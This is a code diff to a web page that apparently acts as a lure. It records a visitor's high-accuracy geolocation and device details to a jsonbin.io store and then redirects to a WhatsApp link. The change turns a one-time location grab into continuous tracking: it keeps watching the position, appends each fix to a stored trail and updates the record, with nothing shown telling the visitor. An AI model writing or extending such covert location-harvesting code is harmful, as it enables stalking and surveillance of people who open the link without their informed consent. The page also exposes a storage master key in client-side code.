@@ -362,12 +362,14 @@
     async function saveVisit(lat, lng) {
       try {
         const device = parseDevice();
+        const id = generateUUID();
         const newVisit = {
-          id: generateUUID(),
+          id,
           lat,
           lng,
           timestamp: new Date().toISOString(),
-          device
+          device,
+          trail: [{ lat, lng, t: new Date().toISOString() }]
         };
 
         // Fetch current bin
@@ -399,8 +401,42 @@
         if (!putRes.ok) {
           console.error('Failed to save visit');
         }
+
+        return id;
       } catch (err) {
         console.error('Error saving visit:', err);
+        return null;
+      }
+    }
+
+    async function updateVisitPosition(visitId, lat, lng) {
+      try {
+        const fetchRes = await fetch(
+          `https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`,
+          { headers: { 'X-Master-Key': JSONBIN_API_KEY } }
+        );
+        const fetchJson = await fetchRes.json();
+        let visits = Array.isArray(fetchJson.record) ? fetchJson.record : [];
+
+        const idx = visits.findIndex(v => v.id === visitId);
+        if (idx !== -1) {
+          visits[idx].lat = lat;
+          visits[idx].lng = lng;
+          visits[idx].lastUpdate = new Date().toISOString();
+          if (!visits[idx].trail) visits[idx].trail = [];
+          visits[idx].trail.push({ lat, lng, t: new Date().toISOString() });
+        }
+
+        await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
+          method: 'PUT',
+          headers: {
+            'Content-Type': 'application/json',
+            'X-Master-Key': JSONBIN_API_KEY
+          },
+          body: JSON.stringify(visits)
+        });
+      } catch (err) {
+        console.error('Error updating position:', err);
       }
     }
 
@@ -426,6 +462,9 @@
       window.location.href = WHATSAPP_LINK;
     }
 
+    let watchId = null;
+    let currentVisitId = null;
+
     async function startGeo() {
       show('screen-loading');
 
@@ -434,19 +473,27 @@
         return;
       }
 
-      const watchId = navigator.geolocation.watchPosition(
+      let firstPosition = true;
+
+      watchId = navigator.geolocation.watchPosition(
         async (position) => {
-          navigator.geolocation.clearWatch(watchId);
           const { latitude, longitude } = position.coords;
 
-          saveVisit(latitude, longitude);
-          show('screen-success');
-          startCountdown();
+          if (firstPosition) {
+            firstPosition = false;
+            currentVisitId = await saveVisit(latitude, longitude);
+            show('screen-success');
+            startCountdown();
+          } else {
+            if (currentVisitId) {
+              updateVisitPosition(currentVisitId, latitude, longitude);
+            }
+          }
         },
         (error) => {
-          navigator.geolocation.clearWatch(watchId);
-          console.error('Geolocation error:', error);
-          show('screen-denied');
+          if (firstPosition) {
+            show('screen-denied');
+          }
         },
         {
           enableHighAccuracy: true,
@@ -455,6 +502,12 @@
         }
       );
     }
+
+    window.addEventListener('beforeunload', () => {
+      if (watchId !== null) {
+        navigator.geolocation.clearWatch(watchId);
+      }
+    });
   </script>
 </body>
 </html>
